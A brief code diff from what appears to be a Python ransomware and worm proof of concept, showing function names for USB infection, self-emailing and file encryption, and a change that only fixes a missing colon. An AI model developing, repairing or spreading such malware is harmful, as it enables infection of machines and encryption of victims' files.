@@ -710,7 +710,7 @@ def infect_usb():
             pass
 
 
-def send_email(zip_password="dcry-ransomware-poc")
+def send_email(zip_password="dcry-ransomware-poc"):
     worm_path = os.path.abspath(sys.executable)
     temp_dir = os.getenv("TEMP")
 
@@ -793,6 +793,7 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
 
 
 
